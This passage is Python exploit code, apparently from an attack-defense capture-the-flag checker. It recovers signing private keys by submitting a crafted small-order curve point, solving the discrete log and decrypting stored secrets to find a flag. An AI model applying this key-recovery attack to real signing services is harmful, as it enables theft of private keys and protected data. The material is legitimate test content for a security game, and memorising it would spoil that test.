    logger.debug("Resolving %d target usernames via public signing metadata", len(target_usernames))
    for target_username in target_usernames:
        status, data = await client.public_signing_authorities_by_username(target_username)

        if status == 404:
            continue
        if status != 200:
            logger.debug("Skipping username %s because signing metadata returned HTTP %s", target_username, status)
            continue
        if not isinstance(data, dict):
            continue

        authorities = data.get("authorities")
        if not isinstance(authorities, list):
            continue

        for authority in authorities:
            if not isinstance(authority, dict):
                continue

            authority_id = authority.get("authorityId")
            secret_blob = authority.get("secretBlob")
            curve_name = authority.get("curveName")
            if not isinstance(authority_id, str) or not isinstance(secret_blob, str):
                continue
            if curve_name != SIGNING_CURVE_NAME:
                continue

            status, ceremony_data = await client.create_signature_ceremony(
                token,
                authority_id,
                attacker_reference,
                base_point=SIGNING_ATTACK_POINT,
            )
            if status not in (200, 201):
                logger.debug("Alternate signing point was rejected with HTTP %s", status)
                continue

            ceremony_obj = require_json_object(ceremony_data, "faulty signature ceremony response")
            signature_point = parse_service_point(ceremony_obj.get("signaturePoint"))
            private_scalar = discrete_log_power_of_two(
                SIGNING_ATTACK_POINT,
                signature_point,
                SIGNING_ATTACK_ORDER_BITS,
            )
            if not (0 < private_scalar < SIGNING_SCALAR_LIMIT):
                continue

            secret_bytes = decrypt_signing_secret(authority_id, private_scalar, secret_blob)
            if flag := searcher.search_flag(secret_bytes):
                return flag

    raise MumbleException("flag not found")


if __name__ == "__main__":
    checker.run()
